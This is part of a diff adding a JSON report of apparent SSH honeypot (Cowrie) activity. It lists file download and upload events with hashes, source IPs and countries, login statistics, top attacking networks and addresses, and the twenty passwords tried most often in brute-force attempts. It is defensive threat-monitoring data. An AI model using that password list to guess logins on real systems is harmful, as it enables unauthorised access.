+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:28:49.229774",
+   "url": ""
+  },
+  {
+   "address": "187.154.98.53",
+   "country_code": "MX",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:29:07.526857",
+   "url": ""
+  },
+  {
+   "address": "120.28.109.188",
+   "country_code": "PH",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 20:29:24.820316",
+   "url": ""
+  },
+  {
+   "address": "177.106.59.42",
+   "country_code": "BR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 22:15:20.251577",
+   "url": ""
+  },
+  {
+   "address": "107.150.96.71",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 22:19:38.046986",
+   "url": ""
+  },
+  {
+   "address": "191.97.12.90",
+   "country_code": "CO",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-19 22:21:47.496276",
+   "url": ""
+  },
+  {
+   "address": "125.227.156.55",
+   "country_code": "TW",
+   "event": "cowrie.session.file_upload",
+   "filename": "4Aht9v9k",
+   "sha256": "6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b",
+   "timestamp": "2026-09-19 22:58:22.789316",
+   "url": "/home/pi/4Aht9v9k"
+  },
+  {
+   "address": "125.227.156.55",
+   "country_code": "TW",
+   "event": "cowrie.session.file_upload",
+   "filename": "4Aht9v9k",
+   "sha256": "6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b",
+   "timestamp": "2026-09-19 22:58:22.853789",
+   "url": "/home/pi/4Aht9v9k"
+  },
+  {
+   "address": "181.228.80.171",
+   "country_code": "AR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 01:44:07.373385",
+   "url": ""
+  },
+  {
+   "address": "198.98.62.211",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:20:19.954384",
+   "url": ""
+  },
+  {
+   "address": "101.47.37.236",
+   "country_code": "SG",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:21:02.066896",
+   "url": ""
+  },
+  {
+   "address": "175.118.127.138",
+   "country_code": "KR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:28:55.802346",
+   "url": ""
+  },
+  {
+   "address": "65.181.112.168",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:29:25.962904",
+   "url": ""
+  },
+  {
+   "address": "103.93.160.210",
+   "country_code": "ID",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:30:14.905425",
+   "url": ""
+  },
+  {
+   "address": "36.67.227.242",
+   "country_code": "ID",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:33:06.153521",
+   "url": ""
+  },
+  {
+   "address": "173.249.52.138",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 02:35:05.345134",
+   "url": ""
+  },
+  {
+   "address": "83.216.111.153",
+   "country_code": "SE",
+   "event": "cowrie.session.file_upload",
+   "filename": "KhtMNcQj",
+   "sha256": "6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b",
+   "timestamp": "2026-09-20 03:07:54.183360",
+   "url": "/home/pi/KhtMNcQj"
+  },
+  {
+   "address": "83.216.111.153",
+   "country_code": "SE",
+   "event": "cowrie.session.file_upload",
+   "filename": "KhtMNcQj",
+   "sha256": "6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b",
+   "timestamp": "2026-09-20 03:07:54.303303",
+   "url": "/home/pi/KhtMNcQj"
+  },
+  {
+   "address": "187.140.194.128",
+   "country_code": "MX",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:05:27.169693",
+   "url": ""
+  },
+  {
+   "address": "179.27.97.205",
+   "country_code": "UY",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:05:50.955336",
+   "url": ""
+  },
+  {
+   "address": "81.193.216.17",
+   "country_code": "PT",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:06:03.306319",
+   "url": ""
+  },
+  {
+   "address": "39.174.42.18",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:08:14.385978",
+   "url": ""
+  },
+  {
+   "address": "200.77.172.159",
+   "country_code": "MX",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:10:49.559775",
+   "url": ""
+  },
+  {
+   "address": "51.195.40.26",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:47:08.217863",
+   "url": ""
+  },
+  {
+   "address": "150.241.77.28",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 05:47:30.575300",
+   "url": ""
+  },
+  {
+   "address": "212.227.145.117",
+   "country_code": "ES",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 06:09:08.059697",
+   "url": ""
+  },
+  {
+   "address": "103.200.22.154",
+   "country_code": "VN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 06:11:10.395047",
+   "url": ""
+  },
+  {
+   "address": "43.134.85.158",
+   "country_code": "SG",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 07:51:16.150649",
+   "url": ""
+  },
+  {
+   "address": "220.119.37.141",
+   "country_code": "KR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 10:05:07.643561",
+   "url": ""
+  },
+  {
+   "address": "103.216.145.2",
+   "country_code": "IN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 10:05:27.332602",
+   "url": ""
+  },
+  {
+   "address": "45.78.201.248",
+   "country_code": "SG",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 10:13:33.727716",
+   "url": ""
+  },
+  {
+   "address": "117.50.119.132",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "timestamp": "2026-09-20 11:29:55.396084",
+   "url": ""
+  },
+  {
+   "address": "202.165.15.132",
+   "country_code": "MY",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 14:46:08.906438",
+   "url": ""
+  },
+  {
+   "address": "172.190.89.127",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 14:51:41.416538",
+   "url": ""
+  },
+  {
+   "address": "158.178.141.16",
+   "country_code": "AU",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 14:53:23.813179",
+   "url": ""
+  },
+  {
+   "address": "121.229.205.104",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 15:15:37.638805",
+   "url": ""
+  },
+  {
+   "address": "42.51.49.166",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 15:53:29.146380",
+   "url": ""
+  },
+  {
+   "address": "69.5.21.194",
+   "country_code": "ID",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "9ecbeee2c88e701fe3d39e868c0a102cc77c033775f8fa9625ae83e9150a2a50",
+   "timestamp": "2026-09-20 16:20:24.772264",
+   "url": ""
+  },
+  {
+   "address": "115.74.7.119",
+   "country_code": "VN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 17:29:54.619407",
+   "url": ""
+  },
+  {
+   "address": "106.12.120.171",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "timestamp": "2026-09-20 17:35:52.314743",
+   "url": ""
+  },
+  {
+   "address": "199.241.120.131",
+   "country_code": "KR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 17:49:44.200921",
+   "url": ""
+  },
+  {
+   "address": "101.36.111.191",
+   "country_code": "HK",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 17:49:46.854276",
+   "url": ""
+  },
+  {
+   "address": "191.37.76.156",
+   "country_code": "BR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 17:54:31.805849",
+   "url": ""
+  },
+  {
+   "address": "103.86.198.253",
+   "country_code": "BD",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 20:05:29.581789",
+   "url": ""
+  },
+  {
+   "address": "117.2.49.125",
+   "country_code": "VN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 20:08:47.267685",
+   "url": ""
+  },
+  {
+   "address": "150.5.169.176",
+   "country_code": "HK",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 20:53:26.130135",
+   "url": ""
+  },
+  {
+   "address": "101.47.159.125",
+   "country_code": "SG",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:17:03.523578",
+   "url": ""
+  },
+  {
+   "address": "58.186.20.101",
+   "country_code": "VN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:17:16.964881",
+   "url": ""
+  },
+  {
+   "address": "106.12.177.73",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:18:50.720752",
+   "url": ""
+  },
+  {
+   "address": "69.49.246.176",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:33:07.420954",
+   "url": ""
+  },
+  {
+   "address": "83.233.149.23",
+   "country_code": "SE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:36:48.770472",
+   "url": ""
+  },
+  {
+   "address": "115.190.249.177",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:38:46.999374",
+   "url": ""
+  },
+  {
+   "address": "211.20.14.156",
+   "country_code": "TW",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 21:40:35.175007",
+   "url": ""
+  },
+  {
+   "address": "102.88.137.80",
+   "country_code": "NG",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 23:24:33.958868",
+   "url": ""
+  },
+  {
+   "address": "36.92.107.106",
+   "country_code": "ID",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 23:27:17.104127",
+   "url": ""
+  },
+  {
+   "address": "42.1.65.77",
+   "country_code": "VN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-20 23:30:13.555751",
+   "url": ""
+  },
+  {
+   "address": "154.83.16.14",
+   "country_code": "HK",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 00:00:26.928247",
+   "url": ""
+  },
+  {
+   "address": "49.207.247.78",
+   "country_code": "IN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 00:36:28.401619",
+   "url": ""
+  },
+  {
+   "address": "49.207.247.78",
+   "country_code": "IN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
+   "timestamp": "2026-09-21 00:36:30.973915",
+   "url": ""
+  },
+  {
+   "address": "150.136.214.177",
+   "country_code": "US",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 00:38:21.998578",
+   "url": ""
+  },
+  {
+   "address": "180.106.83.59",
+   "country_code": "CN",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 01:24:59.988921",
+   "url": ""
+  },
+  {
+   "address": "103.213.238.91",
+   "country_code": "BD",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 01:26:27.840581",
+   "url": ""
+  },
+  {
+   "address": "102.223.92.101",
+   "country_code": "GH",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 01:26:59.078758",
+   "url": ""
+  },
+  {
+   "address": "41.215.133.245",
+   "country_code": "KE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 01:30:31.080894",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-21 01:46:03.096094",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-21 01:46:03.096437",
+   "url": ""
+  },
+  {
+   "address": "51.178.84.57",
+   "country_code": "FR",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 02:18:56.742487",
+   "url": ""
+  },
+  {
+   "address": "69.5.20.205",
+   "country_code": "ID",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 02:19:34.137009",
+   "url": ""
+  },
+  {
+   "address": "102.210.149.105",
+   "country_code": "KE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 02:19:51.809448",
+   "url": ""
+  },
+  {
+   "address": "101.36.125.2",
+   "country_code": "HK",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 02:34:57.158569",
+   "url": ""
+  },
+  {
+   "address": "49.231.192.36",
+   "country_code": "TH",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2",
+   "timestamp": "2026-09-21 04:29:23.193748",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-21 05:54:53.250170",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-21 05:54:53.250844",
+   "url": ""
+  }
+ ],
+ "logins": {
+  "accepted": 35034,
+  "distinct_passwords": 2488,
+  "distinct_usernames": 732,
+  "refused": 192
+ },
+ "meta": {
+  "sanitised_values": {
+   "honeypot-public-ip": 1
+  },
+  "schema_version": 1,
+  "source": "nsm.cowrie_events",
+  "top_n": 20,
+  "window_end": "2026-09-21 06:20:17.680938",
+  "window_start": "2026-09-14 05:57:05.761100"
+ },
+ "networks": [
+  {
+   "as_org": "LLC Rusbuilding",
+   "asn": 199458,
+   "events": 19109,
+   "sessions": 2389,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+   "asn": 135377,
+   "events": 6250,
+   "sessions": 797,
+   "source_addresses": 12
+  },
+  {
+   "as_org": "UNMANAGED LTD",
+   "asn": 47890,
+   "events": 3606,
+   "sessions": 602,
+   "source_addresses": 10
+  },
+  {
+   "as_org": "Alibaba (US) Technology Co., Ltd.",
+   "asn": 45102,
+   "events": 4414,
+   "sessions": 587,
+   "source_addresses": 9
+  },
+  {
+   "as_org": "TECHOFF SRV LIMITED",
+   "asn": 48090,
+   "events": 4400,
+   "sessions": 578,
+   "source_addresses": 10
+  },
+  {
+   "as_org": "Wowrack.com",
+   "asn": 27323,
+   "events": 4605,
+   "sessions": 576,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "VIET DIGITAL TECHNOLOGY LIABILITY COMPANY",
+   "asn": 135918,
+   "events": 2984,
+   "sessions": 373,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "Wan and lan Internet Pvt.Ltd",
+   "asn": 55862,
+   "events": 1974,
+   "sessions": 248,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "Google LLC",
+   "asn": 396982,
+   "events": 854,
+   "sessions": 171,
+   "source_addresses": 66
+  },
+  {
+   "as_org": "Beijing Volcano Engine Technology Co., Ltd.",
+   "asn": 137718,
+   "events": 696,
+   "sessions": 149,
+   "source_addresses": 17
+  },
+  {
+   "as_org": "Akamai Technologies, Inc.",
+   "asn": 63949,
+   "events": 224,
+   "sessions": 78,
+   "source_addresses": 31
+  },
+  {
+   "as_org": "DigitalOcean, LLC",
+   "asn": 14061,
+   "events": 515,
+   "sessions": 75,
+   "source_addresses": 15
+  },
+  {
+   "as_org": "Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.",
+   "asn": 680,
+   "events": 320,
+   "sessions": 41,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "CHINA UNICOM China169 Backbone",
+   "asn": 4837,
+   "events": 123,
+   "sessions": 27,
+   "source_addresses": 13
+  },
+  {
+   "as_org": "Hangzhou Alibaba Advertising Co.,Ltd.",
+   "asn": 37963,
+   "events": 71,
+   "sessions": 25,
+   "source_addresses": 18
+  },
+  {
+   "as_org": "VIETNAM POSTS AND TELECOMMUNICATIONS GROUP",
+   "asn": 135905,
+   "events": 112,
+   "sessions": 25,
+   "source_addresses": 2
+  },
+  {
+   "as_org": "BANATSYNC SRL",
+   "asn": 198364,
+   "events": 60,
+   "sessions": 22,
+   "source_addresses": 6
+  },
+  {
+   "as_org": "Korea Telecom",
+   "asn": 4766,
+   "events": 95,
+   "sessions": 19,
+   "source_addresses": 17
+  },
+  {
+   "as_org": "Amazon.com, Inc.",
+   "asn": 16509,
+   "events": 70,
+   "sessions": 19,
+   "source_addresses": 3
+  },
+  {
+   "as_org": "Storm Industries LLC",
+   "asn": 219502,
+   "events": 92,
+   "sessions": 19,
+   "source_addresses": 5
+  }
+ ],
+ "passwords": [
+  {
+   "attempts": 2287,
+   "password": "123456",
+   "source_addresses": 52
+  },
+  {
+   "attempts": 1013,
+   "password": "123",
+   "source_addresses": 41
+  },
+  {
+   "attempts": 805,
+   "password": "1234",
+   "source_addresses": 44
+  },
+  {
+   "attempts": 543,
+   "password": "1",
+   "source_addresses": 32
+  },
+  {
+   "attempts": 530,
+   "password": "12345678",
+   "source_addresses": 38
+  },
+  {
+   "attempts": 453,
+   "password": "password",
+   "source_addresses": 38
+  },
+  {
+   "attempts": 391,
+   "password": "root",
+   "source_addresses": 37
+  },
+  {
+   "attempts": 327,
+   "password": "12345",
+   "source_addresses": 45
+  },
+  {
+   "attempts": 299,
+   "password": "123456789",
+   "source_addresses": 39
+  },
+  {
+   "attempts": 246,
+   "password": "admin",
+   "source_addresses": 61
+  },
+  {
+   "attempts": 189,
+   "password": "1qaz@WSX",
+   "source_addresses": 30
+  },
+  {
+   "attempts": 175,
+   "password": "abc123",
+   "source_addresses": 31
+  },
+  {
+   "attempts": 156,
+   "password": "123123",
+   "source_addresses": 30
+  },
+  {
+   "attempts": 155,
+   "password": "admin123",
+   "source_addresses": 35
+  },
+  {
+   "attempts": 140,
+   "password": "passwd",
+   "source_addresses": 25
+  },
+  {
+   "attempts": 133,
+   "password": "P@ssw0rd",
+   "source_addresses": 33
+  },
+  {
+   "attempts": 131,
+   "password": "test",
+   "source_addresses": 29
+  },
+  {
+   "attempts": 128,
+   "password": "1234567890",
+   "source_addresses": 32
+  },
+  {
+   "attempts": 127,
+   "password": "qwe123!@",
+   "source_addresses": 27
+  },
+  {
+   "attempts": 125,
+   "password": "qwerty",
+   "source_addresses": 29
+  }
+ ],
+ "session_seconds": {
+  "instant": 151,
+  "longest": 356.639,
+  "median": 1.25,
+  "p90": 5.593
+ },
+ "top_addresses": [
+  {
+   "address": "109.160.32.61",
+   "as_org": "",
+   "asn": 0,
+   "commands": 2528,
+   "country": "United States",
+   "country_code": "US",
+   "events": 20262,
+   "first_seen": "2026-09-17 05:37:28.709460",
+   "last_seen": "2026-09-19 04:00:47.928886",
+   "sessions": 2536,
+   "usernames_tried": 351
+  },
+  {
+   "address": "206.123.140.188",
+   "as_org": "LLC Rusbuilding",
+   "asn": 199458,
+   "commands": 2388,
+   "country": "Germany",
+   "country_code": "DE",
+   "events": 19109,
+   "first_seen": "2026-09-14 20:36:46.038325",
+   "last_seen": "2026-09-15 18:23:39.660772",
+   "sessions": 2389,
+   "usernames_tried": 3
+  },
+  {
+   "address": "109.160.32.79",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1488,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11932,
+   "first_seen": "2026-09-15 15:03:47.702920",
+   "last_seen": "2026-09-19 02:21:53.455964",
+   "sessions": 1494,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.100",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 21:25:59.139384",
+   "last_seen": "2026-09-16 23:30:11.174300",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.115",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 15:37:55.679833",
+   "last_seen": "2026-09-16 18:13:18.560462",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.117",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-18 19:05:53.551306",
+   "last_seen": "2026-09-18 20:50:27.212804",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.120",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-16 17:09:56.555752",
+   "last_seen": "2026-09-16 19:15:34.071301",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.19",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 19:07:32.704212",
+   "last_seen": "2026-09-15 21:18:26.477860",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.23",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-18 14:31:20.372006",
+   "last_seen": "2026-09-18 17:26:39.502875",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
+  {
+   "address": "109.160.32.34",
+   "as_org": "",
+   "asn": 0,
+   "commands": 1432,
+   "country": "United States",
+   "country_code": "US",
+   "events": 11480,
+   "first_seen": "2026-09-15 13:14:38.707964",
+   "last_seen": "2026-09-15 15:19:59.990683",
+   "sessions": 1437,
+   "usernames_tried": 343
+  },
